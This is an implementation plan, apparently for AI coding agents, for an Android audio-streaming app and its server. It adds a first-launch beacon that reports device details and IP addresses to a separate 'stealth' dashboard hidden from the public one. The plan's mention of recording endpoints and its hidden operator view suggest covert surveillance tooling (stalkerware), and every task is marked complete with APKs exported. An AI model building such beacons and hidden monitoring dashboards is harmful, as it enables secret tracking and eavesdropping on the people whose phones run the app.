# Automatic App Install & Activation Beacon Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement automated app installation / first-launch beacon detection in the Android client that notifies the server immediately upon initial launch, registers the device in the database, and displays live installation alerts in the monitoring dashboard.

**Architecture:** Android client checks `SharedPreferences` on launch; on the very first open, it captures hardware and OS specs (model, manufacturer, Android API, app version, install timestamp) and transmits an install-beacon event via HTTP POST and WebSocket to the server. The Express backend records the installation in a dedicated SQLite table (`device_installs`), emits real-time WebSocket notifications to connected monitor clients, and displays live installation banners and history in the stealth dashboard.

**Tech Stack:** Kotlin (Android SharedPreferences, OkHttp / DeviceSocketManager), Node.js / TypeScript (Express, better-sqlite3, WebSocket Gateway), HTML5 / Vanilla JS / CSS.

---

## Global Constraints

- **Platform Technical Truth:** Android OS security holds newly installed APKs in a stopped state until first opened by the user. The install beacon triggers automatically on first launch / activation.
- **Resilience:** If offline or server is unreachable on first open, the beacon must retry on subsequent network availability or app opens until acknowledged by the server.
- **Backward Compatibility:** Existing recording and audio streaming endpoints must remain completely unaffected.
- **Stealth / Hidden Focus:** Extended install details and live install banners appear in the stealth dashboard (`stealth.html` / `stealth.js`), keeping the public dashboard clean.

---

## File Structure

- **Create:** `android-client/app/src/main/kotlin/com/audiostream/client/InstallBeaconManager.kt` — Standalone manager to detect first launch, gather device specs, and dispatch the install beacon with offline retry.
- **Modify:** `android-client/app/src/main/kotlin/com/audiostream/client/MainActivity.kt` — Trigger `InstallBeaconManager` on startup with current server URL.
- **Modify:** `android-client/app/src/main/kotlin/com/audiostream/client/DeviceSocketManager.kt` — Include `is_new_install` metadata in initial WebSocket handshake if pending.
- **Modify:** `server/src/database.ts` — Add `device_installs` table and database queries (`recordDeviceInstall`, `getDeviceInstalls`).
- **Modify:** `server/src/routes/broadcast.ts` — Add `POST /api/v1/broadcasts/install-beacon` endpoint.
- **Modify:** `server/src/routes/dashboard.ts` — Add `GET /api/v1/dashboard/installs` endpoint.
- **Modify:** `server/src/websocket.ts` — Handle `app_installed` event and broadcast `new_install` alerts to dashboard listeners.
- **Modify:** `server/stealth/stealth.html` — Add install metrics card and notification container.
- **Modify:** `server/stealth/stealth.js` — Handle `new_install` WebSocket messages, fetch install history, and render toast notifications.

---

### Task 1: Server Database Schema & Ingestion Routes (`database.ts`, `broadcast.ts`, `dashboard.ts`)

**Files:**
- Modify: `server/src/database.ts`
- Modify: `server/src/routes/broadcast.ts`
- Modify: `server/src/routes/dashboard.ts`

- [x] **Step 1: Create `device_installs` table and DB helper functions in `database.ts`**
  Add table schema:
  ```sql
  CREATE TABLE IF NOT EXISTS device_installs (
      id              INTEGER PRIMARY KEY AUTOINCREMENT,
      client_id       TEXT    NOT NULL,
      device_model    TEXT    NOT NULL,
      manufacturer    TEXT    NOT NULL,
      os_version      TEXT    NOT NULL,
      app_version     TEXT    NOT NULL,
      ip_address      TEXT    DEFAULT '',
      installed_at    TEXT    NOT NULL
  );
  CREATE INDEX IF NOT EXISTS idx_installs_client ON device_installs(client_id);
  CREATE INDEX IF NOT EXISTS idx_installs_date ON device_installs(installed_at);
  ```
  Add methods:
  - `recordDeviceInstall(clientId: string, deviceModel: string, manufacturer: string, osVersion: string, appVersion: string, ipAddress: string): DeviceInstall`
  - `getDeviceInstalls(limit?: number): DeviceInstall[]`
  - `getDeviceInstallCount(): number`

- [x] **Step 2: Add `POST /api/v1/broadcasts/install-beacon` in `broadcast.ts`**
  - Accept JSON payload: `{ client_id, device_model, manufacturer, os_version, app_version, installed_at }`
  - Determine client IP address (`req.ip` or `req.headers['x-forwarded-for']`)
  - Save to DB via `recordDeviceInstall`
  - Broadcast live WebSocket event `new_install` to connected monitoring sockets
  - Return `{ status: 'ok', message: 'Install beacon recorded' }`

- [x] **Step 3: Add `GET /api/v1/dashboard/installs` in `dashboard.ts`**
  - Return list of recent installs with total count: `{ status: 'ok', count: number, installs: DeviceInstall[] }`

---

### Task 2: WebSocket Server Live Event Dispatch (`websocket.ts`)

**Files:**
- Modify: `server/src/websocket.ts`

- [x] **Step 1: Add `broadcastLiveEvent` helper**
  - Sends a JSON payload to all active WebSockets that have registered or subscribed to monitoring events.

- [x] **Step 2: Handle `install_beacon` in `handleDeviceMessage`**
  - If a device sends an `install_beacon` type over an active WebSocket, persist to DB and broadcast to stealth dashboards.

---

### Task 3: Android Client InstallBeaconManager (`InstallBeaconManager.kt` & `MainActivity.kt`)

**Files:**
- Create: `android-client/app/src/main/kotlin/com/audiostream/client/InstallBeaconManager.kt`
- Modify: `android-client/app/src/main/kotlin/com/audiostream/client/MainActivity.kt`

- [x] **Step 1: Implement `InstallBeaconManager.kt`**
  - Read `SharedPreferences`:
    `val hasReported = prefs.getBoolean("has_reported_install", false)`
  - If already reported, return immediately.
  - If not reported:
    - Extract hardware and OS details:
      - `client_id`: UUID stored in prefs (`client_id`)
      - `manufacturer`: `Build.MANUFACTURER`
      - `model`: `Build.MODEL`
      - `os_version`: `"Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})"`
      - `app_version`: package manager `versionName` (or default `"1.0.0"`)
      - `installed_at`: current ISO timestamp
    - Build JSON payload and perform asynchronous HTTP POST to `${serverUrl}/api/v1/broadcasts/install-beacon`.
    - Upon HTTP 200 response, commit `prefs.edit().putBoolean("has_reported_install", true).apply()`.

- [x] **Step 2: Trigger beacon on startup in `MainActivity.kt`**
  - In `onCreate()`, call `InstallBeaconManager.checkAndSendBeacon(this, savedUrl)` right after reading saved server URL.

---

### Task 4: Stealth Dashboard Live Banner & Installation Feed (`stealth.html` & `stealth.js`)

**Files:**
- Modify: `server/stealth/stealth.html`
- Modify: `server/stealth/stealth.js`

- [x] **Step 1: Add Install Metrics & Feed to `stealth.html`**
  - Add a metric card: `📱 Total Installs` with element ID `#stat-total-installs`.
  - Add a real-time toast/banner container `#install-alert-banner` to announce new device installs instantly.

- [x] **Step 2: Add dynamic event listeners & data loader in `stealth.js`**
  - Fetch `/api/v1/dashboard/installs` on page load and populate the installs count.
  - In the WebSocket message handler, listen for `msg.type === 'new_install'`:
    - Play subtle notification or show high-visibility banner:
      `🎉 New Device Installed: {manufacturer} {model} (Android {os_version})`
    - Update the installation counter.

---

### Task 5: Build, Test & Export Android APK

**Files:**
- Output: `app.apk` and `AudioStreamApp-latest.apk`

- [x] **Step 1: Compile server TypeScript**
  Run `npm run build` in `server/` to verify no compile errors.

- [x] **Step 2: Build Android Debug APK**
  Run `& ".\.tools\gradle-8.2\bin\gradle.bat" assembleDebug` in `android-client/`.

- [x] **Step 3: Export output APKs**
  Copy `android-client/app/build/outputs/apk/debug/app-debug.apk` to `app.apk` and `AudioStreamApp-latest.apk` in workspace root.
